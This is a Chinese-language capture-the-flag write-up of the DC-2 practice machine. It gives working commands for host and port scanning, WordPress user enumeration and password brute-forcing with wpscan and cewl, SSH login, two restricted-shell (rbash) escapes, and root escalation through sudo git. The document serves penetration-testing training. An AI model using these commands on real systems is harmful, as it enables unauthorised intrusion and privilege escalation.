# DC2靶机渗透

扫描网段存活主机

```
arp-scan -l
nmap -sP 192.168.3.62/24
nmap -sS 192.168.3.62/24
```

随便一种即可

![image-20211109115832385](images/1.png)

发现DC2的ip192.168.3.35

![image-20211109115911297](images/2.png)

80端口开启访问一下,重定向到了http://dc-2/

但是跳转页面无法访问将 ip 地址、域名 添加到 /etc/hosts 文件

发现开了80端口却无法访问，是重定向到dc-2域名，可改hosts文件配置dns解析访问，添加ip对应域名

```
win10路径：C:\Windows\System32\drivers\etc\hosts

linux路径：/etc/hosts
```

![image-20211109120511917](images/3.png)

![image-20211109121003144](images/4.png)

重新访问发现页面是WordPress的默认页面

![image-20211109121106018](images/5.png)

用Chrome的插件也可以看到

![image-20211109121214564](images/6.png)

访问Flag![image-20211109121121752](images/7.png)

```
你通常的词表可能不起作用，所以，也许你只需要cewl。

密码越多越好，但有时你不可能赢得所有密码。

以一个身份一个登录以查看下一个标志。

如果找不到，请以其他用户身份登录。
```

先简单的扫一下目录

```
nikto -h 192.168.3.35
dirb http://dc-2/
```

随便选一种即可,用御剑和dirsearch也可以

扫到了wp-login.php

![image-20211109130606730](images/8.png)

进入到登陆界面

![image-20211109130642204](images/9.png)

用wpscan进行用户爆破

```
wpscan --url http://dc-2 -e u
```

爆破出来了三个用户名

![image-20211109132212670](images/10.png)

flag1提示用cewl生成字典

```
cewl http://dc-2 -w passwds.txt
或者
cewl hhtp://dc-2 > passwds.txt
```

![image-20211109132408958](images/11.png)

接下来再爆破一下密码

```
wpscan --url http://dc-2 -P passwds.txt
```

![image-20211109132632407](images/12.png)

爆破出了jerry和tom的密码

登陆找到flag2

![image-20211109132740399](images/13.png)

这里说如果你不能用WordPress走捷径,这里有另外一种方法希望你能找到它

登陆tom也是一样

这里因为是我们之前的nmap扫描端口的时候没有扫描完全

`nmap -p- 192.168.3.35` 扫描所有范围的端口

![image-20211109133131584](images/14.png)

发现了7744端口,但是并没有扫描出是什么服务

```
nmap -sV -p- 192.168.3.35
```

![image-20211109133239693](images/15.png)

发现这个端口是ssh服务,尝试用之前爆破出来的用户名和密码登陆ssh

```
ssh jerry@192.168.3.35 -p 7744
ssh tom@192.168.3.35 -p 7744
```

登陆jerry的时候发现密码错误,应该是ssh和WordPress的密码不一样,但是登陆tom的时候成功

![image-20211109133655091](images/16.png)

这里发现了flag3.txt

![image-20211109133802986](images/17.png)

但是当我cat的时候报出了rbash错误,vim也不行

网上搜到这里的rbash是可以绕过的,而且这里的flag3.txt可以直接用vi命令打开

![image-20211109134115447](images/18.png)

![image-20211109134106032](images/19.png)

绕过rbash的第一种方法,vi编辑器

```
vi：set shell=/bin/sh
运行shell:shell
```

![image-20211109134338935](images/20.png)

进入shell

![image-20211109134356195](images/21.png)

执行如下命令

```
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
```

![image-20211109134451812](images/22.png)

成功绕过

第二种方法

```
BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`
export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出
export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出
```

一样能够绕过rbash

![image-20211109134657599](images/23.png)

tom和Jerry是两个用户,提示使用su切换用户

直接su也是不行的,也需要绕过rbash,这里我rbash已经绕过了,直接切换到jerry用户,密码是刚才爆破出来的密码

![image-20211109135609297](images/24.png)

返回上一个目录

![image-20211109135645342](images/25.png)

进入jerry的用户目录

![image-20211109135712436](images/26.png)

发现flag4.txt

![image-20211109135731184](images/27.png)

提示了git,可能是要提权了,看看SUID权限有哪些

```
find / -perm -u=s 2>/dev/null
```

![image-20211109140022959](images/28.png)

并没有发现git

`sudo -l`发现git不需要root权限就可以执行

![image-20211109140056108](images/29.png)

```
sudo git -p config # -p强制进入交互模式
!/bin/sh
```

![image-20211109140848052](images/30.png)

进入root目录发现最后一个flag

![image-20211109140908788](images/31.png)

参考链接

https://blog.csdn.net/Huangshanyoumu/article/details/115771158

https://icode9.com/content-4-1092275.html

https://cloud.tencent.com/developer/article/1666654)

